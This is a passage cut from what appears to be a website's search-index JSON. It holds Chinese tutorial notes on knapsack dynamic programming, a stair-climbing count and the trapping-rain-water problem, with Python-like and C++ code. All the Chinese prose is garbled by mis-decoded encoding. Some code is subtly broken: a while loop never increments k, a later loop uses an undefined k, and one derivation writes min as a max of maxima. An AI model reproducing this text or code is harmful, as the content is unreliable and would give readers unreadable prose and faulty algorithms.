d[1] + 20) = 20 è§‚å¯Ÿä¸€ä¸‹ä»å°åˆ°å¤§éå†æœ‰æ²¡æœ‰ä»€ä¹ˆé—®é¢˜? å½“i==1, è®¡ç®—d[3] çš„æ—¶å€™, ç”¨åˆ°äº†d[0], ä½†æ˜¯d[0] å…¶å®å·²ç»è¢«æ›´æ–°äº†, æ˜¯æ–°çš„: d[0] = 0 åŒç†å½“i==1, è®¡ç®—d[4] çš„æ—¶å€™, ç”¨åˆ°äº†d[1], ä½†æ˜¯d[1] å…¶å®å·²ç»è¢«æ›´æ–°äº†, æ˜¯æ–°çš„: d[1] = 15 é‚£ä¹ˆæ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜å‘¢? ç­”æ¡ˆå°±æ˜¯ ä»å¤§åˆ°å°éå† , å› ä¸ºå½“æ›´æ–° d[j] æ˜¯, éœ€è¦ç”¨åˆ°çš„ j-w[i] å¾€å¾€æ˜¯å°äº å½“å‰jçš„, æ‰€ä»¥æˆ‘ä»¬åªè¦å…ˆæ›´æ–°æœ€å¤§çš„, è¿™ä¸ªæ—¶å€™ j-w[i] è¿˜æ²¡è¢«æ›´æ–°, è¿˜æ˜¯ä¸Šæ¬¡çš„. ç®€è€Œè¨€ä¹‹, è®¡ç®— d[i][j] æ—¶, ä¾èµ– d[i-1][j-width[i]] , éœ€è¦ä¿è¯ä¸Šä¸€å±‚çš„æ•°æ®ä½¿ç”¨çš„æ—¶å€™è¿˜æ˜¯åŸæ¥çš„, å³ ç¡®ä¿ ``d[i-1][j-width[i]]`` å­˜å‚¨çš„æ˜¯ä¸Šä¸€è¡Œçš„å€¼ï¼Œå³ç¡®ä¿ ``d[j-width[i]]`` è¿˜æ²¡æœ‰è¢«æ›´æ–°ï¼Œæ‰€ä»¥éå†æ–¹å‘æ˜¯ä»å¤§åˆ°å°ã€‚ ç¼–ç : for i in range(n): # éå†ç‰©å“ for j in range(big_package_size, -1, -1): # éå†èƒŒåŒ…å®¹é‡ if j >= weight[i]: d[j] = max(d[j], d[j - weight[i]] + value[i]) else: # è¯´æ˜å‰é¢çš„éƒ½ä¸æ»¡è¶³ j - weight[i] >= 0 , å€¼å°±æ˜¯å½“å‰å€¼, ç›´æ¥è·³å‡ºæ­¤å¤„å¾ªç¯ break ç®—æ³•ç¤ºä¾‹-å®Œå…¨èƒŒåŒ… æœ‰ä¸€ä¸ªç‰©å“é‡é‡æ•°æ® width å’Œ å…¶ä¸­æ¯ä¸€ä¸ªç‰©å“å¯¹åº”çš„ä»·å€¼æ•°ç»„ value, .. ä»¥åŠæ¯ä¸€ä¸ªç‰©å“çš„èŠ±è´¹æ•°ç»„ cost(å°±æ˜¯ä½ è¦æ‹¿è¿™ä¸ªç‰©å“è¦ç”¨å¤šå°‘é’±ä¹°), ä¸” æ¯ä¸€ä¸ªç‰©å“iæ˜¯æ— é™çš„ , æ¯”å¦‚ width[i] çš„å•ä»·å€¼æ˜¯ value[i], .. è´­ä¹°å•ä»¶éœ€è¦èŠ±è´¹ cost[i] æ±‚å½“èƒŒåŒ…å®¹é‡ä¸º big-package æ—¶, èƒ½è£…ä¸‹ç‰©å“çš„æœ€å¤§ä»·å€¼ ä¸ ç®—æ³•ç¤ºä¾‹-01èƒŒåŒ…é—®é¢˜ ç›¸æ¯”, å®Œå…¨èƒŒåŒ…ç‰©å“æœ‰æ— é™ä¸ª ä¸å…¶ç›¸ä¼¼, å¾—å‡ºè§„å¾‹: é€‰æ‹© 0 ä»¶ç‰©å“i çš„æœ€å¤§ä»·å€¼ï¼Œå³: d[i-1][j] é€‰æ‹© 1 ä»¶ç‰©å“i çš„æœ€å¤§ä»·å€¼ï¼Œå³: d[i-1][j-width[i]] + value[i] é€‰æ‹© 2 ä»¶ç‰©å“i çš„æœ€å¤§ä»·å€¼ï¼Œå³: d[i-1][j-width[i]*2] + value[i]*2 ... è®°å¾—è€ƒè™‘æ¡ä»¶, ä¸èƒ½è¶…è¿‡èƒŒåŒ…å®¹é‡: j-width[i] * k >= 0 è¿˜æ˜¯å…ˆéå†ç‰©å“ æ–¹ç¨‹: d[i][j] = max(d[i-1][j], d[i-1][j-width[i]*k] + value[i]*k) # =ã€‹ å½“kä¸º0 d[i-1][j-width[i]*k] + value[i]*k = d[i-1][j] # æ‰€ä»¥å¯ä»¥ç›´æ¥å†™æˆ d[i][j] = max({d[i-1][j-width[i]*k] + value[i]*k}) å½“è€ƒè™‘kæ—¶ç¼–ç : for i in range(n): for j in range(big_package_size+1): # åˆå§‹ d[i][j] = d[i-1][j] # å³k==0 k = 1 # while j-width[i]*k >= 0: while j >= width[i]*k: d[i][j] = max( d[i][j], d[i-1][j-width[i]*k] + value[i]*k ) å¯ä»¥çœ‹å‡ºæ—¶é—´å¤æ‚åº¦æ˜¯æ¯”è¾ƒé«˜çš„, è¿™ä¸ªæ—¶å€™æ˜¯å¦å¯ä»¥å°†kçš„å› ç´ ç»™å»æ‰å‘¢? å¯ä»¥. å…ˆçœ‹åŸå§‹çš„æ–¹ç¨‹: d[i][j] = max({d[i-1][j-width[i]*k] + value[i]*k}) å°†kå±•å¼€: d[i][j] = max({d[i-1][j-width[i]*k] + value[i]*k}) = max(d[i-1][j-width[i]*0] + value[i]*0, d[i-1][j-width[i]*1] + value[i]*1, d[i-1][j-width[i]*2] + value[i]*2 ... d[i-1][j-width[i]*k] + value[i]*k ) å¯ä»¥ç®€å•çš„å¾—åˆ°å½“å®¹é‡ç»Ÿä¸€å‡å°width[i]æ—¶: d[i][j-width[i]] = max(d[i-1][j-width[i]*1] + value[i]*0, d[i-1][j-width[i]*2] + value[i]*1, d[i-1][j-width[i]*3] + value[i]*2 ... d[i-1][j-width[i]*(k+1)] + value[i]*k ) å¯¹äºmaxæ¥è¯´, åœ¨å…¶ä¸ŠåŠ å‡ä¸€ä¸ªæ•°æ˜¯ä¸å½±å“ç»“æœçš„, æ‰€ä»¥å¯¹ä¸Šä¸€ä¸ªå¼å­ç»Ÿä¸€åŠ ä¸Švalue[i]: d[i][j-width[i]] + value[i] = max(d[i-1][j-width[i]*1] + value[i]*1, d[i-1][j-width[i]*2] + value[i]*2, d[i-1][j-width[i]*3] + value[i]*3 ... d[i-1][j-width[i]*(k+1)] + value[i]*(k+1) ) å°±å¾—åˆ°äº†: d[i][j] = max(d[i-1][j-width[i]*k] + value[i]*k) # 0 <= k < max_k # å°†0åˆ†ç¦»å‡ºæ¥ d[i][j] = max(d[i-1][j], d[i-1][j-width[i]*k] + value[i]*k) # 1 <= k < max_k # å¸¦å…¥ä¸Šé¢å¯¹maxçš„æ“ä½œ d[i][j-width[i]] + value[i] d[i][j] = max(d[i-1][j], d[i][j-width[i]] + value[i]) # 1 <= k < max_k å¯ä»¥ç®€å•çš„ç†è§£ä¸º, å½“è®¡ç®—ç‰©å“iæ—¶, ä»ç›¸é‚»çš„ç‰©å“(å¯èƒ½æ˜¯è‡ªå·±)ç®—èµ·, æ­¤æ—¶æ¶ˆæ‰kç¼–ç : for i in range(n): for j in range(big_package_size+1): if j >= width[i]: d[i][j] = max( d[i-1][j], d[i][j-width[i]] + value[i] ) else: d[i][j] = d[i-1][j] ä½¿ç”¨ æ»šåŠ¨æ•°ç»„ , è½¬æ¢ä¸ºä¸€ç»´æ•°ç»„ æ–¹ç¨‹: d[j] = max(d[j], d[j-width[i]] + value[i]) æ³¨æ„æ­¤æ—¶ä¸01èƒŒåŒ…ä¸åŒ, 01èƒŒåŒ…ä½¿ç”¨çš„æ˜¯ä¸Šä¸€å±‚çš„, æ‰€ä»¥å†…å¾ªç¯æ˜¯ä»å¤§åˆ°å°éå†, ä½†æ˜¯æ­¤æ—¶æ˜¯å®Œå…¨èƒŒåŒ…, ä½¿ç”¨çš„æ˜¯å½“å‰å±‚çš„æ•°æ®, éœ€è¦å…ˆæ›´æ–°, æ‰€ä»¥å®Œå…¨èƒŒåŒ…å†…å¾ªç¯æ˜¯ä»å°åˆ°å¤§éå†: for i in range(n): for j in range(big_package_size+1): if j >= width[i]*k: d[j] = max( d[j], d[j-width[i]] + value[i] ) æ­¤å¤„å†…å¾ªç¯æ˜¯ä»å°åˆ°å¤§éå†, ç®€è€Œè¨€ä¹‹, è®¡ç®— d[i][j] æ—¶, ä¾èµ– d[i][j-width[i]] , éœ€è¦ä¿è¯æ•°æ®ä½¿ç”¨çš„æ—¶å€™è¿˜æ˜¯å½“å‰å±‚å·²ç»æ›´æ–°çš„. å³ ç¡®ä¿ ``d[i][j-width[i]]`` å­˜å‚¨çš„æ˜¯å½“å‰è¡Œçš„å€¼ï¼Œç¡®ä¿ ``d[j-width[i]]`` å·²ç»æ›´æ–°ï¼Œæ‰€ä»¥éå†æ–¹å‘æ˜¯ä»å°åˆ°å¤§ã€‚ å‚è€ƒ: ã€åŠ¨æ€è§„åˆ’/èƒŒåŒ…é—®é¢˜ã€‘ä»æ•°å­¦è§’åº¦æ¨å¯¼ã€Œå®Œå…¨èƒŒåŒ…ã€ä¸ã€Œ01 èƒŒåŒ…ã€ä¹‹é—´çš„éå†é¡ºåºå…³ç³» èƒŒåŒ…é—®é¢˜æ€»ç»“( 1 ) 01 èƒŒåŒ…ï¼Œå®Œå…¨èƒŒåŒ…ï¼Œå¤šé‡èƒŒåŒ…ï¼Œåˆ†ç»„èƒŒåŒ… ç®—æ³•ç¤ºä¾‹-çˆ¬æ¥¼æ¢¯ æœ‰ä¸€ä¸ªå°é˜¶ 1~n, æ¯æ¬¡å¯ä»¥èµ° 1~n æ­¥(nä¸å¤§äºå‰©ä½™æ¥¼æ¢¯æ•°), æœ‰å¤šå°‘ç§èµ°æ³• è§£: è€ƒè™‘åœ¨ç¬¬né˜¶çš„æ—¶å€™, ç”¨ d[n] è¡¨ç¤ºä¸€å…±æœ‰å¤šå°‘é€‰æ‹©, æœ‰è¿™äº›é€‰æ‹© ä» n-1 å¼€å§‹, èµ° 1 æ­¥, é‚£ä¹ˆåªéœ€è¦è€ƒè™‘ d[n-1] æœ‰å¤šå°‘ç§ (èµ°ä¸€æ­¥çš„æœ¬èº«ä¸å‰é¢çš„æ¯ä¸€ä¸ª d[n-1] æ„æˆä¸€ç§é€‰æ‹©, æ‰€ä»¥æ²¡æœ‰é¢å¤–éœ€è¦åŠ çš„) æ³¨è§£ å¯¹å¾ˆå¤šäººæ¥è¯´, æœ€å¡çš„ä¸€ç‚¹å°±æ˜¯, æ²¡æƒ³é€š: d[n-1] ä¸­çš„æ¯ä¸€ç§æ–¹æ¡ˆ, éƒ½ä¸æœ€åçš„ä¸€æ­¥, ä¸€èµ·ç»§ç»­æ„æˆè¿™ä¸€ç§æ–¹æ¡ˆ , ä¸‹åŒ ä» n-2 å¼€å§‹, èµ° 2 æ­¥, d[n-2] ä» n-3 å¼€å§‹, èµ° 3 æ­¥, d[n-3] çœç•¥... ä» 1 å¼€å§‹, èµ° n-1 æ­¥, d[1], æ˜¾è€Œæ˜“è§ d[1] = 1 å¯ä»¥æ¨æ–­å‡º: d[n] = d[n-1] + d[n-2] + d[n-3] + ... + d[1] ç¼–ç : d = [0] * (n+1) d[1] = 1 for i in range(2, n+1): for j in range(1, i): # j èŒƒå›´æ˜¯, [1, i-1], å› ä¸º j ä¸º i çš„æ—¶å€™åŠ çš„æ˜¯ d[0], å€¼ä¸º0, å¯ä»¥ç®€åŒ–æ‰ d[i] += d[i-j] # å†…å¾ªç¯ä¹Ÿå¯ä»¥ä»å¤´éƒ¨åŠ èµ·æ¥ # for j in range(1, i): # d[i] += d[j] return d[n] ä¼˜åŒ–, ç”±ä¸Šé¢çš„é€’æ¨å…¬å¼å¯ä»¥æ¨æ–­å‡º: d[n-1] = d[n-2] + d[n-3] + ... + d[1] æ‰€ä»¥, åŸæ¥çš„é€’æ¨å¯ä»¥å˜åŒ–ä¸º: d[n] = d[n-1] + d[n-2] + d[n-3] + ... + d[1] = d[n-1] + (d[n-2] + d[n-3] + ... + d[1]) = d[n-1] + d[n-1] = 2 * d[n-1] å³: d[n] = 2 * d[n-1] ä¹Ÿå°±è¯´è¯´, ç¬¬nä¸ªç»“æœæ˜¯ä¸Šä¸€ä¸ªç»“æœçš„ 2 å€, é‚£å°±å¥½åŠäº†, ä¸€å…±æœ‰ n ä¸ªå°é˜¶, ä¸€å…±éœ€è¦è¢«ç´¯ä¹˜(n-1)æ¬¡, ç›´æ¥: return 2 ** (n-1) ä¹Ÿå¯ä»¥ç¬¨ä¸€ç‚¹é€’å½’ä¹˜: d = [0] * (n+1) d[1] = 1 for i in range(2, n+1): d[i] = 2 * d[i-1] return d[n] å…¶ä»–-æ¥é›¨æ°´ å…·ä½“æ¡ˆä¾‹éœ€è¦è·ç¦»åˆ†æ, æ¯”å¦‚æ¥é›¨æ°´é—®é¢˜, å‚è€ƒ: ç»å…¸é¢è¯•é¢˜ï¼šæ¥é›¨æ°´é—®é¢˜è¯¦è§£ å°±æ˜¯ç”¨ä¸€ä¸ªæ•°ç»„è¡¨ç¤ºä¸€ä¸ªæ¡å½¢å›¾ï¼Œé—®ä½ è¿™ä¸ªæ¡å½¢å›¾æœ€å¤šèƒ½æ¥å¤šå°‘æ°´: int trap(int[] height); æœ€é‡è¦çš„å‡ ç‚¹: å¯¹äºæ¯ä¸€ä¸ªä½ç½®i, èƒ½æ¥åˆ°çš„é›¨æ°´æ•°: min(l_max, r_max) - height[i] æ¯ä¸€ä¸ªä½ç½®i, å·¦å³çš„æœ€é«˜å€¼éƒ½å¯ä»¥å…ˆç®—å‡º, è¿™æ˜¯å¤‡å¿˜å½•çš„åŸºç¡€ æš´åŠ›: int trap(vector<int>& height) { int n = height.size(); int ans = 0; for (int i = 1; i < n - 1; i++) { int l_max = 0, r_max = 0; // æ‰¾å³è¾¹æœ€é«˜çš„æŸ±å­ for (int j = i; j < n; j++) r_max = max(r_max, height[j]); // æ‰¾å·¦è¾¹æœ€é«˜çš„æŸ±å­ for (int j = i; j >= 0; j--) l_max = max(l_max, height[j]); // å¦‚æœè‡ªå·±å°±æ˜¯æœ€é«˜çš„è¯ï¼Œ // l_max == r_max == height[i] ans += min(l_max, r_max) - height[i]; } return ans; } å¤‡å¿˜å½•è§£æ³•: int trap(vector<int>& height) { if (height.empty()) return 0; int n = height.size(); int ans = 0; // æ•°ç»„å……å½“å¤‡å¿˜å½• vector<int> l_max(n), r_max(n); // åˆå§‹åŒ– base case l_max[0] = height[0]; r_max[n - 1] = height[n - 1]; // ä»å·¦å‘å³è®¡ç®— l_max for (int i = 1; i < n; i++) l_max[i] = max(height[i], l_max[i - 1]); // ä»å³å‘å·¦è®¡ç®— r_max for (int i = n - 2; i >= 0; i--) r_max[i] = max(height[i], r_max[i + 1]); // è®¡ç®—ç­”æ¡ˆ for (int i = 1; i < n - 1; i++) ans += min(l_max[i], r_max[i]) - height[i]; return ans; } åŒæŒ‡é’ˆè§£æ³•: int trap(vector<int>& height) { if (height.empty()) return 0; int n = height.size(); int left = 0, right = n - 1; int ans = 0; int l_max = height[0]; int r_max = height[n - 1]; while (left <= right) { l_max = max(l_max, height[left]); r_max = max(r_max, height[right]); // ans += min(l_max, r_max) - height[i] if (l_max < r_max) { ans += l_max - height[left]; left++; } else { ans += r_max - height[right]; right--; } } return ans; } ä»”ç»†å‘ç°, åŒæŒ‡é’ˆç›¸å¯¹äºå¤‡å¿˜å½•å…¶å®æœ‰ç‚¹ä¸åŒ, å¤‡å¿˜å½•è®¡ç®—çš„æ˜¯æ¯æ¬¡ç´§é‚»ä½ç½®iå·¦å³çš„æœ€é«˜ç‚¹, å³ l_max[i] å’Œ r_max[i] ä»£è¡¨çš„æ˜¯ height[0..i] å’Œ height[i..end] çš„æœ€é«˜æŸ±å­é«˜åº¦; åŒæŒ‡é’ˆä»…ä»…æ˜¯å½“å‰æŒ‡é’ˆä½ç½®ä¸€ä¾§æœ€é«˜ç‚¹, å³ l_max å’Œ r_max ä»£è¡¨çš„æ˜¯ height[0..left] å’Œ height[right..end] çš„æœ€é«˜æŸ±å­é«˜åº¦. é‚£åè€…ä¸ºä»€ä¹ˆå¯ä»¥ä»£è¡¨å‰è€…? è¿˜æ˜¯çœ‹è®¡ç®—å…¬å¼: min(l_max, r_max) - height[i] æˆ‘ä»¬éœ€è¦çš„åªæ˜¯ l_max, r_max ä¸­çš„æœ€å°å€¼, å…ˆçœ‹å¤‡å¿˜å½•, ä¸æ­£å¸¸çš„æ€ç»´ä¸€è‡´: min(l_max, r_max) = max(max(height[0..i]), max(height[i..end])) å†çœ‹åŒæŒ‡é’ˆ: min(l_max, r_max) = max(max(height[0..left]), max(height[right..end])) åŒºåˆ«å°±æ˜¯å°‘è€ƒè™‘äº† height[left..right], é‚£ä¹ˆè¿™ä¸ªåŒºé—´ä¼šé€ æˆå½±å“å—? è§£æè¯´æ˜ å…ˆè€ƒè™‘: max(height[0..left]) < max(height[right..end]) # å³ l_max < r_max çš„æƒ…å†µ, å¦‚æœ height[left..right] åŒºé—´çš„å€¼éƒ½æ¯” max(height[right..end]) (å³r_max) å°äº†, é‚£ä¹ˆå®é™…ä¸¤è€…å°±æ˜¯ç­‰ä»·çš„: max(max(height[0..left]), max(height[right..end])) = max(max(height[0..i]), max(height[i..end])) å¦‚æœheight[left..right] åŒºé—´çš„å€¼å­˜åœ¨æ¯” max(height[right..end]) (å³r_max) å¤§çš„, å³ä½¿æ‰¾åˆ°é‚£ä¸ªå€¼(è®°ä¸º r_plus )äº†, å°±æ˜¯: max(l_max, r_max) => max(l_max, r_plus) # ä¸Šé¢è¯´äº†è¿™æ˜¯ l_max < r_max çš„æƒ…å†µ, æ‰€ä»¥ ä¸¤è€…çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ å› ä¸º l_max < r_max, å¯¹äºæ¯” r_max æ›´å¤§çš„ r_plus, l_max < r_plus è‚¯å®šä¹Ÿæ˜¯æˆç«‹çš„ ä¸¤è€…ä¹Ÿæ˜¯ç­‰ä»·çš„ åä¹‹å½“ l_max > r_max åŒæ ·ä¹Ÿæˆç«‹, æ‰€ä»¥å®Œå…¨å¯ä»¥ç”¨åŒæŒ‡é’ˆ.","tags":"æ•°æ®ç»“æ„","url":"/yq-doc-source-docs-data-structure-index.html","loc":"/yq-doc-source-docs-data-structure-index.html"},{"title":"æ•°æ®åº“","text":"mysql ä½¿ç”¨ åº•å±‚å®ç° é‡åˆ°è¿‡çš„é—®é¢˜ redis elasticsearch","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-index.html","loc":"/yq-doc-source-docs-database-index.html"},{"title":"æ–‡æ¡£ç›¸å…³","text":"rstæ ‡è®°è¯­è¨€ wiki é—®é¢˜","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-index.html","loc":"/yq-doc-source-docs-document-index.html"},{"title":"å‰ç«¯","text":"æ¡†æ¶ åŒ…ç®¡ç†å™¨ å¼€æºå›¾æ ‡åº“ ./css ES6 ./node typescript å†…ç½®å‡½æ•° é—®é¢˜ æ¦‚å¿µæ€§","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-index.html","loc":"/yq-doc-source-docs-front-end-index.html"},{"title":"æ“ä½œç³»ç»Ÿ","text":"æŒ‰ç…§å¸¸è§ç±»å‹åˆ’åˆ†, å¦‚linux, windowsç­‰ linux windows Android Mac","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-index.html","loc":"/yq-doc-source-docs-operating-system-index.html"},{"title":"åç«¯","text":"ç¼–ç¨‹è¯­è¨€ c java python swift object-c ruby rust go","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-index.html","loc":"/yq-doc-source-docs-rear-end-index.html"},{"title":"ç‰ˆæœ¬æ§åˆ¶","text":"git svn svnä¸gitçš„åŒºåˆ«","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control.html","loc":"/yq-doc-source-docs-version-control.html"}]};